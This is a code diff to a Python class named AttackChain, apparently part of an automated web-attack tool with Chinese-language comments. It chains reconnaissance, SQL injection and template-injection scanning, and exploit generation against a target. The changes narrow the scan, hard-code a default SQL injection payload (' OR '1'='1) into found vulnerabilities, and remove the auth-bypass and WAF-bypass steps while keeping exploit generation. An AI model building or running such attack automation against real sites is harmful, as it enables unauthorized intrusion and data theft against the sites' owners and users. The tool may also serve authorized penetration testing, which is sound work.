@@ -99,7 +99,7 @@ class AttackChain:
     # ── 链 3: Deep Scan ──
     async def chain_deep_scan(self, endpoints: List[Dict]) -> Dict:
         await self._step(f"DEEP-SCAN: 三级 SQLi 提取 + SSTI 全引擎")
-        findings = await self.analyzer.verify_all(endpoints[:40])
+        findings = await self.analyzer.verify_all(endpoints[:10])
         self.report.vulnerabilities_found = findings["vulnerabilities_found"]
         self.report.add_phase("deep-scan", findings)
         return findings
@@ -151,11 +151,12 @@ class AttackChain:
 
         vulns = []
         for f in findings[:5]:
+            ep = f.get("endpoint", f.get("path", "/search"))
             v = Vulnerability(
-                vuln_type=f.get("type", "sqli"),
-                path=f.get("endpoint", "/search"),
+                vuln_type="sqli",
+                path=ep,
                 param="q",
-                payload=f.get("payload", "' OR '1'='1"),
+                payload=f.get("verdicts", [{}])[0].get("payload", "' OR '1'='1") if f.get("verdicts") else "' OR '1'='1",
                 target=self.target,
                 confidence=f.get("confidence", "medium"),
             )
@@ -179,21 +180,13 @@ class AttackChain:
         # 2. Deep Scan
         findings = await self.chain_deep_scan(endpoints)
 
-        # 3. Auth Bypass (if creds provided)
-        if login_path and creds:
-            await self.chain_auth_bypass(login_path, creds)
-
-        # 4. WAF Bypass
-        await self.chain_waf_bypass(endpoints)
-
-        # 5. Exploit generation
+        # 3. Exploit generation (from vulns found)
         vuln_list = findings.get("findings", [])
         if vuln_list:
             await self.chain_exploit_gen(vuln_list)
 
         self.report.total_time = time.monotonic() - t0
 
-        # 6. Print summary
         print(f"\n{'═'*60}")
         print(f"🏁 Full-Auto 完成: {self.report.total_time:.1f}s")
         print(f"  端点: {recon.get('endpoints_found',0)} | 漏洞: {self.report.vulnerabilities_found} | Exploit: {self.report.exploits_generated}")
